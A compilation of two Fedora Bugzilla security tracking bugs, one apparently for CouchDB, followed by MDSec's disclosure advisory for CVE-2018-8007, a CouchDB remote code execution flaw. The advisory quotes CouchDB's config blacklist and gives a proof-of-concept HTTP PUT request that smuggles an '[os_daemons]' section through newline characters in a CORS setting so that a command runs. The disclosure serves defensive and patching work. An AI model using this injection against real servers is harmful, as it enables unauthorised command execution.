| [Description](show_bug.cgi?id=1660403#c0)  Andrej Nemec    2018-12-18 09:40:00 UTC  ```  This is an automatically created tracking bug!  It was created to ensure that one or more security vulnerabilities are fixed in affected versions of fedora-all.  For comments that are specific to the vulnerability please use bugs filed against the "Security Response" product referenced in the "Blocks" field.  For more information see: <http://fedoraproject.org/wiki/Security/TrackingBugs>  When submitting as an update, use the fedpkg template provided in the next comment(s).  This will include the bug IDs of this tracking bug as well as the relevant top-level CVE bugs.  Please also mention the CVE IDs being fixed in the RPM changelog and the fedpkg commit message.  NOTE: this issue affects multiple supported versions of Fedora. While only one tracking bug has been filed, please correct all affected versions at the same time.  If you need to fix the versions independent of each other, you may clone this bug as appropriate.   ```  [Comment 1](show_bug.cgi?id=1660403#c1)  Andrej Nemec    2018-12-18 09:40:06 UTC  ``` Use the following template to for the 'fedpkg update' request to submit an update for this issue as it contains the top-level parent bug(s) as well as this tracking bug.  This will ensure that all associated bugs get updated when new packages are pushed to stable.  =====  # bugfix, security, enhancement, newpackage (required) type=security  # low, medium, high, urgent (required) severity=high  # testing, stable request=testing  # Bug numbers: 1234,9876 bugs=1660402,1660403  # Description of your update notes=Security fix for [PUT CVEs HERE]  # Enable request automation based on the stable/unstable karma thresholds autokarma=True stable_karma=3 unstable_karma=-3  # Automatically close bugs when this marked as stable close_bugs=True  # Suggest that users restart after update suggest_reboot=False  ======  Additionally, you may opt to use the bodhi web interface to submit updates:  <https://bodhi.fedoraproject.org/updates/new>   ```  [Comment 2](show_bug.cgi?id=1660403#c2)  Ben Cotton    2019-10-31 20:17:50 UTC  ``` This message is a reminder that Fedora 29 is nearing its end of life. Fedora will stop maintaining and issuing updates for Fedora 29 on 2019-11-26. It is Fedora's policy to close all bug reports from releases that are no longer maintained. At that time this bug will be closed as EOL if it remains open with a Fedora 'version' of '29'.  Package Maintainer: If you wish for this bug to remain open because you plan to fix it in a currently maintained version, simply change the 'version'  to a later Fedora version.  Thank you for reporting this issue and we are sorry that we were not  able to fix it before Fedora 29 is end of life. If you would still like  to see this bug fixed and are able to reproduce it against a later version  of Fedora, you are encouraged  change the 'version' to a later Fedora  version prior this bug is closed as described in the policy above.  Although we aim to fix as many bugs as possible during every release's  lifetime, sometimes those efforts are overtaken by events. Often a  more recent Fedora release includes newer upstream software that fixes  bugs or makes them obsolete.   ```  [Comment 3](show_bug.cgi?id=1660403#c3)  Ben Cotton    2019-11-27 20:24:38 UTC  ``` Fedora 29 changed to end-of-life (EOL) status on 2019-11-26.

| [Description](show_bug.cgi?id=1601003#c0)  Pedro Sampaio    2018-07-13 14:41:22 UTC  ```  This is an automatically created tracking bug!  It was created to ensure that one or more security vulnerabilities are fixed in affected versions of fedora-all.  For comments that are specific to the vulnerability please use bugs filed against the "Security Response" product referenced in the "Blocks" field.  For more information see: <http://fedoraproject.org/wiki/Security/TrackingBugs>  When submitting as an update, use the fedpkg template provided in the next comment(s).  This will include the bug IDs of this tracking bug as well as the relevant top-level CVE bugs.  Please also mention the CVE IDs being fixed in the RPM changelog and the fedpkg commit message.  NOTE: this issue affects multiple supported versions of Fedora. While only one tracking bug has been filed, please correct all affected versions at the same time.  If you need to fix the versions independent of each other, you may clone this bug as appropriate.   ```  [Comment 1](show_bug.cgi?id=1601003#c1)  Pedro Sampaio    2018-07-13 14:41:25 UTC  ``` Use the following template to for the 'fedpkg update' request to submit an update for this issue as it contains the top-level parent bug(s) as well as this tracking bug.  This will ensure that all associated bugs get updated when new packages are pushed to stable.  =====  # bugfix, security, enhancement, newpackage (required) type=security  # testing, stable request=testing  # Bug numbers: 1234,9876 bugs=1601002,1601003  # Description of your update notes=Security fix for [PUT CVEs HERE]  # Enable request automation based on the stable/unstable karma thresholds autokarma=True stable_karma=3 unstable_karma=-3  # Automatically close bugs when this marked as stable close_bugs=True  # Suggest that users restart after update suggest_reboot=False  ======  Additionally, you may opt to use the bodhi web interface to submit updates:  <https://bodhi.fedoraproject.org/updates/new>   ```  [Comment 2](show_bug.cgi?id=1601003#c2)  Ben Cotton    2019-05-02 21:19:04 UTC  ``` This message is a reminder that Fedora 28 is nearing its end of life. On 2019-May-28 Fedora will stop maintaining and issuing updates for Fedora 28. It is Fedora's policy to close all bug reports from releases that are no longer maintained. At that time this bug will be closed as EOL if it remains open with a Fedora 'version' of '28'.  Package Maintainer: If you wish for this bug to remain open because you plan to fix it in a currently maintained version, simply change the 'version'  to a later Fedora version.  Thank you for reporting this issue and we are sorry that we were not  able to fix it before Fedora 28 is end of life. If you would still like  to see this bug fixed and are able to reproduce it against a later version  of Fedora, you are encouraged  change the 'version' to a later Fedora  version prior this bug is closed as described in the policy above.  Although we aim to fix as many bugs as possible during every release's  lifetime, sometimes those efforts are overtaken by events. Often a  more recent Fedora release includes newer upstream software that fixes  bugs or makes them obsolete.   ```  [Comment 3](show_bug.cgi?id=1601003#c3)  Fedora Update System    2020-03-06 06:41:14 UTC  ``` FEDORA-2020-83f513fd7e has been submitted as an update to Fedora 31. <https://bodhi.fedoraproject.org/updates/FEDORA-2020-83f513fd7e>   ```  [Comment 4](show_bug.cgi?id=1601003#c4)  Fedora Update System    2020-03-06 06:41:16 UTC  ``` FEDORA-2020-73bd8167a0 has been submitted as an update to Fedora 32. <https://bodhi.fedoraproject.org/updates/FEDORA-2020-73bd8167a0>   ```  [Comment 5](show_bug.cgi?id=1601003#c5)  Fedora Update System    2020-03-06 20:23:24 UTC  ``` couchdb-3.0.0-1.fc32 has been pushed to the Fedora 32 testing repository.

# Advisory: CVE-2018-8007 – Apache CouchDB Remote Code Execution

[Home](https://www.mdsec.co.uk/) >
[Knowledge Centre](https://www.mdsec.co.uk/knowledge-centre/) >
[Insights](https://www.mdsec.co.uk/knowledge-centre/insights) >
Advisory: CVE-2018-8007 – Apache CouchDB Remote Code Execution

## Overview

Title: CouchDB Arbitrary Write Local.ini Configuration Authenticated Remote Code Execution

## Description

Sensitive contents can be arbitrarily written on the main CouchDB local.ini configuration file via the REST API due to a lack of input validation. This attack vector can be abused to spawn an arbitrary process and obtain remote code execution in the context of the CouchDB process user.

The vulnerability is essentially a bypass of the security fix implemented for CVE-2017-12636.

The attack requires an authenticated admin user session, which mitigates the overall security risk.

## Technical details

An admin user is allowed to add configuration options via the Fauton web UI. As shown in the CouchDB Erlang code below multiple configuration options with a security impact are explicitly blacklisted, restricting their modification from a console session only.

File: https://github.com/apache/couchdb/blob/master/src/couch/src/couch\_util.erl

[code]-define(BLACKLIST\_CONFIG\_SECTIONS, [

<<“daemons”>>,

<<“external”>>,

<<“httpd\_design\_handlers”>>,

<<“httpd\_db\_handlers”>>,

<<“httpd\_global\_handlers”>>,

<<“native\_query\_servers”>>,

<<“os\_daemons”>>,

<<“query\_servers”>>

]).

check\_config\_blacklist(Section) ->

case lists:member(Section, ?BLACKLIST\_CONFIG\_SECTIONS) of

true ->

Msg = <<“Config section blacklisted for modification over HTTP API.”>>,

throw({forbidden, Msg});

\_ ->

ok

end.

[/code]

This behavior can be however trivially bypassed by inserting newline character sequences to inject an arbitrary blacklisted configuration field. The proof of concept below shows the exploitation using the ‘os\_daemons’ option to obtain remote command execution.

[code]PUT /\_node/couchdb@127.0.0.1/\_config/cors/origins HTTP/1.1

Host: <IP>:5984

Content-Length: 84

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36

Content-Type: application/json

Accept-Encoding: gzip, deflate

Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

Authorization: Basic <authdata>

Connection: close

“http://testdomain.com\n\n[os\_daemons]\nhackdaemon = /usr/bin/touch /tmp/hack”[/code]

After the above request is sent, the local.ini configuration file will contain the malicious os\_daemon entry.

## Timeline

05/01/2018: MDSec reported the vulnerability to the Apache Security team

08/01/2018: MDSec followed up with Apache to confirm receipt after no reply

08/01/2018: Apache responded confirming the report looks credible

11/04/2018: MDSec follow up with Apache stating the intention to release following expiration of 90-day grace period

11/04/2018: Apache ask to hold off disclosure

12/04/2018: MDSec agrees to hold off disclosure within reason

27/04/2018: MDSec contact Apache to inform of change in point of contact for handling disclosures

28/04/2018: Apache respond stating project is run by volunteers and MDSec should subscribe to the CouchDB mailinglists and watch for security patches.

28/04/2018: MDSec respond indicating that we cannot monitor mailinglists for patches and given it’s been 3.5 months since disclosure and admin authentication is required, the vulnerability will be released on 28/05/2018.

30/04/2018: Apache request CVE embargoed until 28/05/2018
